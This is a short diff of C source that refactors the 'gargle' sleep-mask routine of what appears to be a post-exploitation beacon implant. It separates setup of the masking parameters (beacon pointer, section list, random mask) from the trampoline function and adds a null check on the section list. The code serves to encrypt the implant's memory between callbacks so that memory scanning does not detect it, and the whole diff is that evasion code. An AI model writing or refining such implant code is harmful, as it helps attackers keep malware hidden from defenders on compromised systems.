@@ -8,21 +8,13 @@
 void    * gtrampoline = NULL;
 GARGLEP * gparms = NULL;
 
-void gargle_trampoline(void * end, void * begin) {
-	DWORD   dwFunctionSize;
+void gargle_setup_parms(void * begin, void * end) {
 	DWORD * index;
 	DWORD a, b, temp;
 
-	if (gtrampoline != NULL)
+	if (gparms != NULL)
 		return;
 
-	/* calculate the size of our function */
-	dwFunctionSize = (DWORD)((DWORD_PTR)end - (DWORD_PTR)begin);
-
-	/* set trampoline to the start of the sleep mask function */
-	gtrampoline = begin;
-
-	/* setup our parameters, please */
 	gparms = (GARGLEP *)malloc(sizeof(GARGLEP));
 	track_memory_add(gparms, sizeof(GARGLEP), TRACK_MEMORY_MALLOC, FALSE, NULL);
 	gparms->beacon_ptr = (char *)get_beacon_ptr();
@@ -33,6 +25,8 @@ void gargle_trampoline(void * end, void * begin) {
 	 * will not be masked.
 	 */
 	index = gparms->sections;
+	if (index == NULL)
+		return;
 	while (TRUE) {
 		a = *index; b = *(index + 1);
 		if (a == 0 && b == 0) {
@@ -53,4 +47,11 @@ void gargle_trampoline(void * end, void * begin) {
 		index += 2; /* goto the next section */
 	}
 	crypto_rng_get_bytes((unsigned char *)gparms->mask, sizeof(gparms->mask));
+}
+
+void gargle_trampoline(void * end, void * begin) {
+	if (gtrampoline != NULL)
+		return;
+	gtrampoline = begin;
+	gargle_setup_parms(begin, end);
 }
